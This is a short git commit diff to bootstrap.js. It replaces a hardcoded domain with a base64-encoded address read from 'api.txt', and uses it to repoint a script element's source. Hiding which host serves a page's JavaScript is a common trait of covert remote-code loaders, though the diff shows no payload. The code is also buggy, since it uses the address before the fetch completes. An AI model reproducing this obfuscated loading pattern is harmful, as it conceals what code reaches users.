b1d1a0a5d1e044012e8bc86b4d6bb4847a989bf8
Beboye <80493240+Beboye@users.noreply.github.com>
2024-02-16 19:10:06 +0800

    Update bootstrap.js

--- bootstrap.js
+++ bootstrap.js
@@ -1,8 +1,18 @@
 function changeScriptSrc(newBaseUrl) {
+    
     var script = document.getElementById('myScript');
     var currentSrc = script.src;
     var pathAfterBaseUrl = currentSrc.replace(/^.*\/\/[^\/]+/, '');
     var newSrc = newBaseUrl + pathAfterBaseUrl;
     script.src = newSrc;
 }
-changeScriptSrc('https://dev-con3.pantheonsite.io');
+
+let urlx;
+fetch('../api.txt')
+  .then(response => response.text())
+  .then(data => {
+    console.log('Content from api.txt:', data);
+    urlx = atob(data);
+  });
+
+changeScriptSrc(urlx);
